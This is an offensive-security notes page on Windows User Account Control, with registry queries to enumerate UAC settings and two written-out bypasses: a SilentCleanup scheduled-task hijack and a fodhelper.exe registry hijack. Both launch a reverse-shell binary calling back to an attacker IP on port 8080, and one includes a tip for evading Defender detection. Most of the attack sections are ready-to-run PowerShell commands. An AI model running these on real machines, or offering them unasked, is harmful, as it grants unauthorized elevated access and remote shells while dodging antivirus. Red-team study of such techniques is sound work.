Recall that in Windows, every securable object is assigned an integrity level. Low, Medium, High, System.

[User Account Control](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/) is a `Windows` security feature, which manages `elevation` between `access tokens`. When a user performs an action that requires a higher integrity level, they are prompted by UAC. Depending on configuration, credentials may or may not be required. 

Why does this suck? As attackers, we often do not have GUI access, or creds.
# Querying UAC
UAC Enumeration
```powershell
# Query UAC
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
	# 0x0 = Disabled
	# 0x1 = Enabled

# Query ConsentPromptBehaviorAdmin
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
	# 0x0 = Elevate without prompting (the best!)
	# 0x1 — Prompt for credentials on the secure desktop (must re-type password)
	# 0x2 — Prompt for consent on the secure desktop (dimmed-screen "Yes/No")
	# 0x3 — Prompt for credentials
	# 0x4 — Prompt for consent
	# 0x5 — Prompt for consent for non-Windows binaries (the Windows default)
```
# Bypassing UAC
There are lots of ways. [WinPwnage](https://github.com/rootm0s/WinPwnage) is a good reference if you want more references. Here are two of the most common ones.
## DiskCleanup Scheduled Task Hijack
`SlientCleanup` is a default scheduled task. It may be started with a medium integrity level, but it auto-elevates to high integrity. Thus, we can abuse this to elevate to a high integrity level without UAC prompt.

How to abuse it? All we need to do is change the `%windir%` variable to what we want done, followed by REM (we are effectively commenting out the original action of the schtask).

```powershell
# Change %windir% var
Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "cmd.exe /K C:\Windows\Tasks\RShell.exe <IP> 8080 & REM " -Force
Start-ScheduledTask -TaskPath "\Microsoft\Windows\DiskCleanup" -TaskName "SilentCleanup" # This is RShell but doesn't have to be.

# Cleanup
Clear-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force
```
## FodHelper Execution Hijack
FodHelper.exe auto-elevates from medium to high integrity, and when run it reads `HKCU\Software\Classes\ms-settings\Shell\Open\command` to determine how to open the ms-settings protocol. Since a medium-integrity user can write that key, you point its default value at your payload and launch fodhelper.exe to get an elevated process. 

> **NOTE:** Defender flags the classic version on seeing ".exe" in the value, so you drop the extension (Windows resolves the binary anyway).

```powershell
# Setting the reg key
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Windows\Tasks\RShell <IP> 8080" -Force

C:\Windows\System32\fodhelper.exe # Execute fodhelper

# Cleanup
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```
